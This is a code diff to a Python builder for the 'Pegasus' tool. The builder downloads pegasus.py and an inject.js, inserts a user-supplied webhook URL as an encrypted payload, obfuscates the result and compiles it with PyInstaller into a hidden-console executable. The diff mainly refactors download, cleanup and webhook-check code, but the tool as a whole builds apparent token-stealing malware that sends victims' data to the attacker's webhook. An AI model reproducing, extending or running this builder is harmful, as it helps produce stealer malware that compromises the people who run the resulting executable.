@@ -6,7 +6,6 @@ from shutil import rmtree
 from requests import Response, get, exceptions
 from cryptography.fernet import Fernet
 from threading import Thread
-from urllib.parse import urldefrag
 
 from rich.console import Console
 from rich.progress import Progress
@@ -15,11 +14,11 @@ def main(console:Console = None):
     console = console or Console()
 
     console.print(
-        f"""[blue]
+        """[blue]
 __________
 \______   \ ____   _________    ________ __  ______
  |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
- |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \
+ |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \\
  |____|    \___  >___  (____  /____  >____//____  >
                \/_____/     \/     \/           \/
 
@@ -39,15 +38,16 @@ __________
         f"[yellow]Creating {basename}.py with '{webhook}' as webhook...[/yelow]"
     )
     # Download pegasus.py and inject.js
-    raw, _ = download("https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py", "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js")
+    pegasus, _ = download("https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py", "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js", "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus-requirements.txt")
+    filename = f"{basename}.py"
 
-    with open(f"{basename}.py", "w", encoding="utf-8") as f:
-        f.write(raw.read_text().replace('"&WEBHOOK_URL&"', line_to_inject))
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(pegasus.replace('"&WEBHOOK_URL&"', line_to_inject))
 
     console.print(f"[green]Done![/green]")
 
     obfuscation_level = get_level(console)
-    CodeObfuscator(obfuscation_level)
+    CodeObfuscator(filename,obfuscation_level)
 
     compile = prompt(f"[cyan]Obfuscation level (1-30): [/cyan]").lower()
     if compile != "y":
@@ -60,9 +60,15 @@ __________
     prompt("[green]Done!\nPress enter to exit...[/green]")
 
 def clean_build_files(basename:str):
-    rmtree("./build")
-    rmtree("./__pycache__")
-    remove(f"./{basename}-obfuscated.spec")
+    files_to_delete = ("./build", "./__pycache__", f"./{basename}-obfuscated.spec")
+    delete_files(*map(Path, files_to_delete))
+
+def delete_files(*paths:Path):
+    for path in paths:
+        if path.is_dir():
+            rmtree(path)
+        elif path.is_file():
+            remove(path)
 
 def get_token_and_injection_code(webhook:bytes) -> tuple[bytes, str]:
     key = Fernet.generate_key()
@@ -74,19 +80,31 @@ def get_token_and_injection_code(webhook:bytes) -> tuple[bytes, str]:
 def get_webhook(console:Console):
     while True:
         webhook = prompt("[cyan]Webhook URL: [/cyan]")
-
-        try:
-            resp = get(webhook)
-        except exceptions.ConnectionError:
-            console.print(f"[red]Cannot connect to [link={webhook}]the webhook[/link][/red]. Are you sure that you're connected to the internet?")
-            return
+        resp = test_webhook(webhook, console)
 
         if not resp.ok:
             console.print(f"[red link={webhook}]This webhook cannot be found[/red]")
             continue
         return webhook
 
-def download(*urls:str,chunk_size:int=1024) -> tuple[Path]:
+def test_webhook(webhook:str, console:Console) -> Response | None:
+    # While loops within while loops
+        # ew, disgusting
+        while True:
+            try:
+                resp = get(webhook)
+                return resp
+            except exceptions.MissingSchema:
+                webhook = f"https://{webhook}"
+                console.print("[cyan link=https://example.com]URL Schema[/cyan link] [red]is missing[/red], appended [magenta]https://[/magenta] to the url")
+            except exceptions.ConnectionError:
+                console.print(f"[red]Cannot connect to [link={webhook}]the webhook[/link][/red]. Are you sure that you're connected to the internet?")
+                return
+            except Exception:
+                console.print_exception()
+                return
+
+def download(*urls:str,chunk_size:int=1024) -> tuple[str]:
     files = []
     with Progress() as progress:
         threads = tuple(
@@ -104,7 +122,10 @@ def download(*urls:str,chunk_size:int=1024) -> tuple[Path]:
             for thread in threads:
                 thread.join()
 
-    return tuple(*map(Path, files))
+    res = tuple(file.read_text() for file in map(Path, files))
+    delete_files(files)
+
+    return res
 
 def generate_tasks(urls:tuple[str], chunk_size:int, prog:Progress):
     for url in urls:
@@ -124,12 +145,14 @@ def download_file(response:Response, filename:str, task_id:int, prog:Progress, c
 def compile_file(basename:str, console:Console):
     console.print(f"[yellow]Beginning compilation...[/yellow]")
     # Install requirements
-    system("pip install --upgrade -r requirements.txt")
+    system("pip install --upgrade -r pegasus-requirements.txt")
 
     # Build the executable
     system(
         f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ {basename}-obfuscated.py"
     )
+    # Cleanup
+    system("pip uninstall -r pegasus-requirements.txt")
 
 def prompt(prompt:str, console:Console=None) -> str:
     console = console or Console()
